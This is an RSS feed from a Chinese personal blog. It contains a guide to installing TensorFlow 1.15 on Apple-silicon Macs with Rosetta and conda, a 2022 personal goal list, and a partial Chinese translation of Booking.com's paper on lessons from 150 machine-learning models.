<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>咖啡不苦</title>
    <description>赖晨东的博客 | 咖啡不苦</description>
    <link>http://laichendong.com/</link>
    <atom:link href="http://laichendong.com/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Mon, 14 Oct 2024 21:45:04 +0800</pubDate>
    <lastBuildDate>Mon, 14 Oct 2024 21:45:04 +0800</lastBuildDate>
    <generator>Jekyll v4.3.4</generator>
    
      <item>
        <title>如何在Apple芯片的mac上安装tensorflow 1.x</title>
        <description>&lt;p&gt;有时候我们需要再mac上跑一些老的用tensorflow 1.x的代码。但由于历史发展原因，各种依赖的版本无法对齐。无法直接安装，参考以下步骤。&lt;/p&gt;

&lt;p&gt;以tensorflow 1.15为例。 tensorflow 1.15 要求 python 3.7。而python 3.7时期还没有m芯片。所以不能直接conda install python==3.7 安装。需要先安装罗塞塔（rosetta 2），来支持Intel芯片的程序&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;softwareupdate &lt;span class=&quot;nt&quot;&gt;--install-rosetta&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--agree-to-license&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后用conda安装python 3.7&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;## 创建一个空环境&lt;/span&gt;
conda create &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; tf1

&lt;span class=&quot;c&quot;&gt;## 激活&lt;/span&gt;
conda activate tf1

&lt;span class=&quot;c&quot;&gt;## 设置使用 x86_64 架构的通道&lt;/span&gt;
conda config &lt;span class=&quot;nt&quot;&gt;--env&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--set&lt;/span&gt; subdir osx-64

&lt;span class=&quot;c&quot;&gt;## 正常安装 python, 其他包同理&lt;/span&gt;
conda &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;python&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;3.7 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;安装tensorflow&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;conda &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; apple &lt;span class=&quot;nv&quot;&gt;tensorflow&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;1.15
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;到这基本就完成了，但可能还会遇到一些包版本不匹配的情况，自己再手动安装对应正确的版本就好了。比如&lt;/p&gt;

&lt;p&gt;1、ImportError: cannot import name ‘trace’&lt;/p&gt;

&lt;p&gt;是因为conda安装tf1.15时，其中tensorflow-estimator库的版本可能不正确，可以手动重新安装该库&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;conda &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;tensorflow-estimator&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;1.15.1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;2、numpy版本过高&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;conda &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;numpy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;1.16.5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;​&lt;/p&gt;
</description>
        <pubDate>Mon, 14 Oct 2024 00:00:00 +0800</pubDate>
        <link>http://laichendong.com/2024/10/14/how-to-install-tensortflow1.x-on-m1-mac/</link>
        <guid isPermaLink="true">http://laichendong.com/2024/10/14/how-to-install-tensortflow1.x-on-m1-mac/</guid>
        
        <category>tensorflow</category>
        
        <category>rosetta</category>
        
        <category>m1</category>
        
        <category>m2</category>
        
        
        <category>Programing</category>
        
      </item>
    
      <item>
        <title>2022-flags</title>
        <description>&lt;h1 id=&quot;考研-北航--软件学院--电子信息00854&quot;&gt;考研 北航  软件学院  电子信息（00854）&lt;/h1&gt;
&lt;h2 id=&quot;数学二跟住张宇全程班&quot;&gt;数学二，跟住张宇全程班&lt;/h2&gt;
&lt;p&gt;基础阶段：1-6月初《基础30讲》&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt; &lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;时间&lt;/th&gt;
      &lt;th&gt;目录&lt;/th&gt;
      &lt;th&gt;内容&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2-21 到 2-27&lt;/td&gt;
      &lt;td&gt;第7讲&lt;/td&gt;
      &lt;td&gt;零点问题与微分不等式&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2-28 到 3-6&lt;/td&gt;
      &lt;td&gt;第8讲&lt;/td&gt;
      &lt;td&gt;一元函数积分学的概念与计算&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3-7 到 3-13&lt;/td&gt;
      &lt;td&gt;第9讲&lt;/td&gt;
      &lt;td&gt;一元函数积分学的几何应用&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3-14 到 3-20&lt;/td&gt;
      &lt;td&gt;第10讲&lt;/td&gt;
      &lt;td&gt;积分等式与积分不等式&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3-21 到 3-27&lt;/td&gt;
      &lt;td&gt;第11讲&lt;/td&gt;
      &lt;td&gt;多元函数微分学&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3-28 到 4-3&lt;/td&gt;
      &lt;td&gt;第12讲&lt;/td&gt;
      &lt;td&gt;二重积分&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4-4 到 4-10&lt;/td&gt;
      &lt;td&gt;第13讲&lt;/td&gt;
      &lt;td&gt;常微分方程&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4-11 到 4-17&lt;/td&gt;
      &lt;td&gt;第15讲&lt;/td&gt;
      &lt;td&gt;数学一、数学二专题内容&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4-18 到 4-24&lt;/td&gt;
      &lt;td&gt;线代 第1讲&lt;/td&gt;
      &lt;td&gt;行列式&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4-25 到 5-1（51还得7天乐^_^）&lt;/td&gt;
      &lt;td&gt;线代 第2讲&lt;/td&gt;
      &lt;td&gt;矩阵&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5-9 到 5-15&lt;/td&gt;
      &lt;td&gt;线代 第3讲&lt;/td&gt;
      &lt;td&gt;向量组&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5-16 到 5-22&lt;/td&gt;
      &lt;td&gt;线代 第4讲&lt;/td&gt;
      &lt;td&gt;线性方程组&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5-23 到 5-29&lt;/td&gt;
      &lt;td&gt;线代 第5讲&lt;/td&gt;
      &lt;td&gt;特征值与特征向量&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5-30 到 6-5&lt;/td&gt;
      &lt;td&gt;线代 第6讲&lt;/td&gt;
      &lt;td&gt;二次型&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;刷题阶段：《题源1000题》
强化阶段：
真题、冲刺阶段：&lt;/p&gt;
&lt;h2 id=&quot;英语二&quot;&gt;英语二&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;每天至少一篇 voa learning English， 后期可加入voa新闻&lt;/li&gt;
  &lt;li&gt;一周一套历年真题（除写作）：把相关单词也背了&lt;/li&gt;
  &lt;li&gt;写作专项
    &lt;h2 id=&quot;政治&quot;&gt;政治&lt;/h2&gt;
  &lt;/li&gt;
  &lt;li&gt;6月开始？-徐涛强化课，书，1000题&lt;/li&gt;
  &lt;li&gt;冲刺课什么时候跟？ 腿姐？肖？
    &lt;h2 id=&quot;专业课&quot;&gt;专业课&lt;/h2&gt;
  &lt;/li&gt;
  &lt;li&gt;王道数据结构课程全看完&lt;/li&gt;
  &lt;li&gt;C语言怎么办？&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;跑步--400公里120次体重降到130以下&quot;&gt;跑步  400公里(120次)，体重降到130以下&lt;/h1&gt;
&lt;p&gt;一年8个月隔天跑，每次4公里！&lt;/p&gt;
&lt;h1 id=&quot;读书--10本&quot;&gt;读书？  10本&lt;/h1&gt;
&lt;h1 id=&quot;投资理财&quot;&gt;投资理财&lt;/h1&gt;
</description>
        <pubDate>Tue, 04 Jan 2022 00:00:00 +0800</pubDate>
        <link>http://laichendong.com/2022/01/04/2022-flags/</link>
        <guid isPermaLink="true">http://laichendong.com/2022/01/04/2022-flags/</guid>
        
        <category>OKR</category>
        
        
      </item>
    
      <item>
        <title>150个成功的机器学习模型：Booking从中学到的6件事儿</title>
        <description>&lt;h2 id=&quot;摘要&quot;&gt;摘要&lt;/h2&gt;
&lt;p&gt;booking.com是全世界最大的在线旅行服务商。拥有数以百万的消费者和数以百万的酒店提供者，形式包括传统酒店、公寓、民宿、客房等等。早在几年前，我们就运用机器学习技术来提高客户体验及业务指标了。大部分的机器学习的文章都关注在算法和数据相关的方面，很少有人能说明在一个商业利益至上的工业化社会里机器学习技术是如何能产生真正有意义的影响的。我们分析了150个面向消费者的成功的机器学习应用，这些应用是由booking里不同的团队开发的，为全世界数十亿用户使用，并且通过了严格的随机对照实验（RCT）测试。接下来会说明一下我们使用的方法，遇到的挑战和将一个如此复杂的技术推广运用到整个组织的过程中总结的经验教训。我们的主要结论是，一个迭代的、假设驱动的过程，与其他学科相结合，是构建 150 个成功的机器学习产品的基础。&lt;/p&gt;
&lt;h2 id=&quot;1绪论&quot;&gt;1、绪论&lt;/h2&gt;
&lt;p&gt;booking.com是全世界最大的在线旅行服务商。拥有数以百万的消费者和数以百万的酒店提供者，酒店形式包括传统酒店、公寓、民宿、客房等等。我们的平台是由许多不同的产品线上拥有不同专业的团队开发的，包括像booking助手这样的大型应用程序，或者是像搜索结果页这样的具有重要商业价值的网页，也可以是某个网页的一部分，比如在搜索结果页最下面的目的地推荐。不同团队有他们不同的目的，并且使用不同的业务指标来衡量他们的产品价值以及验证假设，这是我们学习过程的核心。我们平台遇到的几个独有的挑战我将他们简短的列在下面：
&lt;strong&gt;高风险：&lt;/strong&gt; 如果推荐错了电影、音乐、书籍和产品会影响用户体验。但绝大部分情况都有可以“撤销”的机会：不听这首歌或不看这个电影，甚至是将不满意的商品退货。但是，一旦你到了住的地方才发现和你想象的不一样，就没那么容易撤销了，你会产生强烈的不满感觉并且离开我们的平台。
&lt;strong&gt;查询输入特别少：&lt;/strong&gt; 用户搜索酒店的时候仅仅会提供他们的目的地，可能还有预定日期和客人的人数。要从这种几乎是0输入的情况下提供令人满意的预定和居住体验是我们的关键挑战之一。
&lt;strong&gt;商品对象复杂：&lt;/strong&gt; 预定一个酒店需要用户在目的地，日期，酒店类型，房间数量，房间类型，退款策略等多个方面考虑。当一个可被预定的对象确定下来之后这些元素就构成了一个多维空间，而且并不是所有的排列组合都是可选的，所以非常难做决定，我们的用户需要帮助来找到最佳组合。
&lt;strong&gt;供应受到约束：&lt;/strong&gt; 酒店的可预订状态是受限和动态的。结合价格，会直接影响消费者的偏好和供应商的行为。而这在设计用户体验时是不能被忽略的因素。
&lt;strong&gt;持续的冷启：&lt;/strong&gt; 消费者通常处在一个持续冷启的状态中。大部分人一年只进行一到两次的旅行活动。当他再次回到我们网站事，他的偏好可能已经有了很大的改变，用户的历史信息通常变得不太重要。并且，每天都有新的酒店和酒店类型加入，他们没有足够的评价和描述内容，比如图片和多语言描述，这使得很难给到他们曝光。无论一个用户访问booking的频率如何，都能提供个性化的体验，并且，在一个新的酒店加入进来的一开始就能给他找到合适的受众，是我们面临的又一困难且非常重要的问题。
&lt;strong&gt;内容过载：&lt;/strong&gt; 租所包含了非常丰富的内容，包括描述、图片、评价和打分。目的地本身也有很多内容，包括房客拍的照片，自然文本的评论内容，访客的推荐和指南。这是个非常强大的广告工具，但同时也非常复杂和难以被消费者认知。将如此丰富的内容以一种友好的方式呈现给用户，并且利用好这部分信息对我们平台来说又是一个关键的挑战。
去年我们用机器学习技术来解决这些和其他一些问题。我们发现要真正的影响商业业绩难的超乎想象，此外，要将模型的的工作和观测到的影响独立开来或者理解他们的联系也很难。相关的问题被其他一些人也提到。Wagstaff发表论文称缺乏如何运用机器学习并在现实问题中产生相关影响的研究和经验。有一个和我们的课题更相近的例子，Jannach等介绍了在推荐系统领域如何用很少的指标来对推荐服务的指标产生影响，比如销售多样性，转化率或者忠诚度。很多其他的期刊也发表了各种具体的机器学习已经他们取得的商业成就的例子，但据我们所知还没有通过机器学习获得商业和用户价值的产品研发测试全过程的研究。
在这个项目中我们分析了150成功的面向消费者的机器学习应用（以及许多相关的失败），分享我们遇到的挑战，我们是如何应对的，我们从中总结的经验教训和一般性建议。包括：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;关于机器学习在一个商业产品中的影响的大规模研究，据我们所知，这是业界的第一个。&lt;/li&gt;
  &lt;li&gt;一组涵盖了机器学习工程全部阶段的“经验总结”。&lt;/li&gt;
  &lt;li&gt;一组解决我们在各个阶段发现的问题的技术解决方案。
论文接下来的部分将按照开发一个机器学习应用的具体研发阶段来组织，用初始，建模，开发，监控和评估命名，以及在最后一节我们做了个总结。
    &lt;h2 id=&quot;2初始阶段机器学习就是产品开发中的瑞士军刀&quot;&gt;2、初始阶段：机器学习就是产品开发中的瑞士军刀&lt;/h2&gt;
    &lt;p&gt;在基于机器学习的工程的初始阶段，产品团队产生点子、假设、商业案例等等，机器学习作为解决方案的一部分。我们学到的一个重要经验就是机器学习可以在不同环境中广泛的被运用到各种不同的产品中。在实践中，我们的模型是帮助不同团队提升他们的产品或者从他们的用户中学习的工具。极端情况下，我们为一个用例建立非常专用的模型。例如，用来优化用户界面中一个特定元素的大小，或者在一个特定环境下的点击流漏斗中提供个性化的推荐。因为是专用模型，我们可以设计和调优到非常好的性能，以期望他们能创造强烈的商业影响。相反，他们的应用仅限于很少的一些用例。另一方面，我们也建立模型来表达有意义&lt;em&gt;语义层&lt;/em&gt;。这些模型可以理解抽象概念，可以让人在产品开发中基于模型的输出用来做新功能介绍、千人千面、促销信息推送等等。例如，他可以指征一个用户在旅行目的地上的灵活性，给到产品团队一个目的地弹性的概念，这样他们就可以提升他们的产品。这些模型提供了一个可解释的信号，并且在产品团队希望使用他们的所有上下文中都有效。这样的需求限制了将模型的预测结果和特定的商业目标结合在一起，但是这些模型的广泛使用抵消了这个缺点，整个平台上生成了几十个用例。具体地说，在我们的分析中，我们发现平均每个语义模型生成的用例是专用用例的两倍。&lt;/p&gt;
    &lt;h3 id=&quot;21-模型系列&quot;&gt;2.1 模型系列&lt;/h3&gt;
    &lt;p&gt;接下来这些段落探索了我们平台上已经开发的不同模型的系列，关注在他们怎么被产品团队使用来影响我们的用户的。这种分类方法可以作为一种理清机器学习能力的一个思维工具，形成我们解决绪论部分提到的问题的策略主干。&lt;/p&gt;
    &lt;h4 id=&quot;211-旅行者偏好模型&quot;&gt;2.1.1 旅行者偏好模型&lt;/h4&gt;
    &lt;p&gt;用户在不同的方面会表现出从无弹性到完全可弹的不同弹性。我们考虑了旅行的一些属性，像目的地，酒店价格，酒店位置，质量，日期，特色设施等等，为这些属性建设了一组机器学习模型，总的来说，构建了一个用户偏好的指标集给每一个属性分配一个弹性级别。这一类模型工作_语义层_。举个例子，日期弹性模型会给出一个用户对于旅行日期的弹性的量化评估。假如用户是有弹性的，在相关场景下就会给日期推荐，但是如果用户对此没有弹性，日期推荐就会造成用户的分心和疑惑，因此就不会显示。另外一种处理日期没弹性用户的方式是，用价格趋势或者是否可预订等信息来强化用户所选择的日期。&lt;/p&gt;
    &lt;h4 id=&quot;212-旅行者情境模型&quot;&gt;2.1.2 旅行者情境模型&lt;/h4&gt;
    &lt;p&gt;人们会以不同的角色进行旅行，和伴侣一起、和家人一起、和朋友一起或只是自己一个人，为了奢华享受或者只是商务出差。他们可能驱车去一个附近的城市，或者坐飞机去世界的另一边，他们可能在一个城市待很长一段时间，也可能在几个城市之间赶场。以上所有的这些例子都是我们所说的_旅行者情境_ ，它包含了一次旅行中的约束和需求。在我们平台上，大部分的这种情境都是不够明确的状态，但其实是可以被清楚描述的，只是被很多用户所遗忘了。因此，在用户预定过程中越早的预测或者猜测到用户所处的情境就越有价值。旅行者情境模型也是工作在语义层的。在这个例子中，研发团队就可以为不同的情境构建不同的特征。家庭出行模型就能预测一次用户的预定行为有多大概率是为家庭出行而进行的。有时候，家庭旅行者忘了填他们随行孩子的个数（如图1（a）），导致在预定过程都走了一大半了才发现选择的酒店不支持儿童入住。家庭出行模型就会提醒用户尽早的填写随行儿童的信息，避免造成上述令人失望的情况。
&lt;img src=&quot;../misc/32754203ddc577cc8fe5752271f210df.png&quot; alt=&quot;32754203ddc577cc8fe5752271f210df.png&quot; /&gt;
                                                                          图1：机器学习模型应用举例&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;213-商品浏览模型&quot;&gt;2.1.3 商品浏览模型&lt;/h4&gt;
&lt;p&gt;大部分用户在寻找酒店的时候，都会通过几个条件来筛选，比如日期、属性、政策、位置等等。为了做出决定，他们必须跟踪他们看到的选项，同时探索相似的选项来做预定决定。我们的商品浏览模型既从这个过程中获得知识，又希望改善它。他们做出不同的动作，包括滚动、点击、排序、过滤等等。这些都会作为用户偏好的一种潜在反馈。这些信号可以被用来加速访问用户访问历史中的相关商品，也可以在全局范围内更快的召回相关商品。&lt;/p&gt;
&lt;h4 id=&quot;214-用户界面优化模型&quot;&gt;2.1.4 用户界面优化模型&lt;/h4&gt;
&lt;p&gt;字体的大小、列表中展示商品的个数、背景颜色和背景图片、视觉元素的存在与否等等，所有的这些都对以业务指标来衡量用户行为有很大的影响。这组模型为不同的业务目标来分别优化这些参数。我们发现很难用一个一刀切的特定的值来对此进行优化，所以我们的模型同时考虑了上下文和用户的信息来做出就好的关于界面优化的决定。&lt;/p&gt;
&lt;h4 id=&quot;215-内容归纳&quot;&gt;2.1.5 内容归纳&lt;/h4&gt;
&lt;p&gt;内容以文本、结构化的调研和照片等形式来描述目的地、地标、酒店等等，这些内容可能有酒店官方、客户、公共数据库等不同的来源。这里面有巨大的机会因为这些内容可以作为广告将用户吸引到特定的城市、日期甚至具体的酒店去。但这也非常复杂，信息量巨大且充满噪音，导致很难被用户使用。&lt;strong&gt;内容归纳&lt;/strong&gt; 就是让这些内容可以被人类所使用的过程。举个例子，我们收集了150万酒店超过17.1亿条的评价，这里面包含了许多关于酒店提供的特色服务的非常有价值的信息，并且这也是一个非常丰富的卖点信息来源。机器学习模型会去归纳这些评论，把酒店的亮点通过结构化的简短的总结表达出来（如图1（b））。&lt;/p&gt;
&lt;h4 id=&quot;216-内容增强&quot;&gt;2.1.6 内容增强&lt;/h4&gt;
&lt;p&gt;在用户浏览、选择、预定和评价一个酒店的全过程中，给我们传递了一些隐藏的信号，这些信号帮助我们对酒店能提供的服务和质量有了更深刻的理解。这组模型通过酒店的属性、目的地、甚至特定的日期信息来增强和清晰化酒店能提供的服务。内容增强有别于内容归纳的地方是，内容归纳是把已经存在的内容变得更加容易获得和理解，而内容增强是用其他方面的各种数据来增强对一个实体的描述。为了说明这个观点，我们来举两个例子：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;最具性价比&lt;/strong&gt;: booking提供了丰富的酒店选择，以设施、位置、服务和设施的质量、政策和许多其他维度的形式提供不同级别的价值。用户需要评估房间的价格和他获得的价值的关系。“今日最佳性价比”标识通过高亮和别的酒店比起来最具性价比的酒店来简化这个过程。用一个机器学习模型来分析数以百万的酒店和他们的交易记录、数以百万的用户的评级来选择一个子集，打上“最具性价比”的标签。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;价格趋势&lt;/strong&gt;：根据预定的预期、旅行的具体日期、目的地等不同的因素，价格会呈现出不同的动态。因为我们每天在每个城市都处理成千上万的预定信息，所以我们可以对一个城市的给定的时间和旅行日期建立一个精确的价格趋势模型。当模型发现一个特别的趋势时，我们可以给用户一些提示来帮助他们做出更好的选择，比如鼓励他们选择一个看起来更有机会的目的地和日期，或者劝他们放弃某些条件。值得注意的是，在这个例子中，被增强的对象不是一个酒店而是一个目的地城市（如图1（c））。
    &lt;h3 id=&quot;22-全部模型可以提供的价值&quot;&gt;2.2 全部模型可以提供的价值&lt;/h3&gt;
    &lt;p&gt;每一组模型都能单独的提供业务价值。图2展示的是在可比的情况下，每一个柱子表示模型对一个核心业务指标中位值的提升与基线之间的关系，基线是基于所有应用计算的，包括基于机器学习的和非机器学习的。绝大部分模型的贡献都高于基线，只有一个在基线以下，但把所有模型影响都加在一起明显是有巨大的正向贡献的。
上面提到的图表显示了再引入或者改进了产品背后的机器学习模型带来的直接影响。我们还观察到当模型成为了一个新产品的基础时，会通过其他的产品产生价值。如此间接的影响很难被量化，但这些效果是清晰的并且是成为了产品团队共识的观念。作为一个例子，图3展示了开发一个目的地推荐系统的每一个研发过程。每一个柱子表示自顶向下关注在某一具体产品侧面的成功迭代，包括用户界面，目标受众，信息展示（标题、描述、消息等等），或者是算法本身。柱子的长度表示相对于第一次迭代的相对影响。所有这些提升都是通过第一个算法实现的，这展示了机器学习模型通过其他产品表现出来的间接影响力。
&lt;img src=&quot;../misc/12a62838b85bab5e89eaa7e48e1159c6.png&quot; alt=&quot;12a62838b85bab5e89eaa7e48e1159c6.png&quot; /&gt;
图2：机器学习模型对相关业务指标中位值的影响
&lt;img src=&quot;../misc/0af815c3281ba2f1ae6e8a05b70b6d37.png&quot; alt=&quot;0af815c3281ba2f1ae6e8a05b70b6d37.png&quot; /&gt;
图3：在推荐产品上的一系列实验。每一个实验都只专注测试一个机器学的设置或训练方法。柱子的长度表示相对于第一个版本观测到的影响。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;3建模阶段离线模型只扮演体检的角色&quot;&gt;3、建模阶段：离线模型只扮演体检的角色&lt;/h2&gt;
&lt;p&gt;通常，评估模型质量的方式是评估或预测模型在没有见过的数据集下的性能表现。用不同的交叉验证方式来评估不同类型的任务（分类、回归、排序），在booking里，我们非常关心一个模型给用户和业务带来的价值。这种价值是通过随机对照实验（RCTs）和转化率、售后单量、退款数等业务指标来衡量的。一个非常有趣的发现是，提高一个模型的性能，不一定会带来价值的提高。图4展示这个洞察。每个点表示一个已经用RCT证明过价值的模型和新模型的对比。横轴表示新模型和当前基线在离线模式下评估的性能差异。数据是分别用ROC、AUC和平均倒数排名的方法来衡量分类和排序算法得来的。纵轴表示的是两个模型在RCT实验中观察到的业务指标上的差异（所有的模型都指向同一个业务指标）。我们一共统计了23对比较（46个模型），目测就可以看出来相关性不足。细致结论是在90%置信区间（-0.45到0.27）的皮尔森相关系数为-0.1，以及在90%置信区间（-0.5到0.19）的斯皮尔曼相关系数为-0.18。要强调的是这种相关性不足不是表现在离线和在线模型之间，而是表现在离线模型性能提升和商业价值提升之间。同时，我们也不想扩大这个结论的一般性，结论的外部有效性很容易被挑战，因为这些模型都是在一个特定的环境中、特定的系统里、以特定的方式构建、全部都有同样的业务目标、并且是都期望提升一个其他模型已经能够提升的指标。然而，我们仍然认为这种相关性的缺乏是一个非凡的发现。事实上，这个发现让我们审视了booking里其他的领域，并且持续得到同样的结果。例如[8]强调了机器翻译（BLEU）的标准性能指标和人类指标表现出非常脆弱的相关性。只有当离线指标和业务指标几乎完全一致是，才能观测到一些相关性。
这种现象可以被解释为各种各样的原因，下面列举一些我们认为最相关的如下：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;价值饱和&lt;/strong&gt; 很明显，业务的价值不能被模型性能的增长而无限提升。在某些点上的价值相对于模型性能来说已经饱和了，模型性能的增长已经不能带来价值的增长，或者只能带来很小的增长，小到没办法在RCT实验中被监测到。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;阶段饱和&lt;/strong&gt; 对比基线测试一个新模型时，我们引入“触发分析（triggered analysis）”来保证我们只关注暴露在更改中的用户，即和模型预测不一致的用户，随着模型的互相改进，这种不一致率会下降，从而实际暴露在新策略的用户和对价值增长的观测能力也会下降。更多的关于模型比较测试的方法细节在后面7.4节会做说明。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;恐怖谷效应&lt;/strong&gt; 随着模型变得越来越好，他们看起来对我们的用户了解的越来越多，或者把用户想做的事情都预测的很好，这可能会让我们的一些客户感到不安（见图 5 和 [10]），这可能会对价值产生负面影响。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;代理指标的过度优化&lt;/strong&gt; 通常，我们的机器学习模型是有监督的，他们优化的指标未必是某个客观的业务指标。比如，我们可能基于CTR构建一个推荐系统，因为我们知道，CTR和我们真正关心的业务指标——转化率高度相关，甚至是因果关系。但是，随着模型变得越来越厉害，他最终可能变成了只提高点击率，而对转化率没有任何真正的影响。这里有个例子是模型学到了推荐给用户和他正在看的非常类似的酒店，引导用户点击（比较所有相似的酒店）但实际上是把用户置于了一个选择困难当中，最终伤害了转化率。通常来说，对代理指标的过度优化将导致用户的分心而偏离了目标。
 &lt;img src=&quot;../misc/2b7fc7303d0f81227ce70f1a76212f55.png&quot; alt=&quot;2b7fc7303d0f81227ce70f1a76212f55.png&quot; /&gt;
 图4：新模型对基线模型的性能变化与业务指标的变化之间的相关性
 &lt;img src=&quot;../misc/bc4d00a50d49e03f405f877e1cbc0b80.png&quot; alt=&quot;bc4d00a50d49e03f405f877e1cbc0b80.png&quot; /&gt;
 图5：恐怖谷：用户不总是对正确的预测做出正向的反应（用马尔科夫链做目的地推荐）。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;单独解决这些问题中的每一个都挺难的。我们的方法是依靠一个开发的快速循环，建立最小模型然后在实验中检验他们，然后用实验结果保持整个事情的持续迭代。离线模型的性能指标只起到一个体检的作用，用来保证算法做的事儿确实是我们想要的。这个循环驱使我们从关注模型的离线性能指标转向产品开发过程中的很多方面，多维度的推进迭代的过程。这些包括下一节中描述的问题构建过程、模型的定性方面（如多样性、透明度、适应性等）、实验设计和延迟。作为一个例子，考虑一个推荐系统，他会预测一个用户对酒店的评级。最小化RMSE（均方根誤差）看起来是一个合理的方法。经过一系列成功的迭代以后，我们假设模型已经丧失多样性了，所以我们建立一个挑战者模型，仍然是降低RMSE，但是要产生更高的多样性。看起来新模型有更高的RMSE，但是他成功的增加了多样性从而使这个RMSE有了合理的解释。这会用来做“多样性问题”的假设验证。不确定的结果会指向模型或者实验设计的调整，来保证我们给了假设一个公平的机会。负向的结果可能会拒绝这个概念，另一方面，正向的结果将鼓励做与多样性相关的变化，不仅是模型，包括用户界面甚至是整个产品都这样&lt;/p&gt;

&lt;h2 id=&quot;4建模在解决一个问题之前先设计他&quot;&gt;4、建模：在解决一个问题之前，先设计他&lt;/h2&gt;
